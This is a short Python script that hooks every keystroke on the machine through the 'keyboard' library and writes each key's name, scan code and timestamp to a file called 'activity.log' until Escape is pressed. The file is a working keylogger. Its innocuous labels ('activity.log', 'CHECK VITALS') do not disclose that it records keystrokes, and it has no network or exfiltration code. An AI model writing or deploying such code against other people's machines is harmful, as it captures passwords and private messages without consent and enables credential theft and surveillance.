import keyboard
import logging

logging.basicConfig(
    filename='activity.log',  # Specify the log file name
    level=logging.INFO,  # Set the logging level (DEBUG, INFO, WARNING, ERROR, CRITICAL)
    format='%(asctime)s - %(levelname)s - %(message)s'  # Specify the log message format
)


def log_vitals(func):
    def wrapper():
        logging.info('[CHECK VITALS] - Engine started...')
        func()
        logging.info('[CHECK VITALS] - Engine ended')

    return wrapper


@log_vitals
def main():
    def get_pressed_key(key):
        log_message = f'{key.event_type} {key.scan_code} {key.name} {key.time}'
        logging.info(log_message)

    keyboard.hook(get_pressed_key)

    try:
        keyboard.wait('esc')
    except KeyboardInterrupt:
        pass  # Allow the program to be stopped with Ctrl+C


if __name__ == "__main__":
    main()
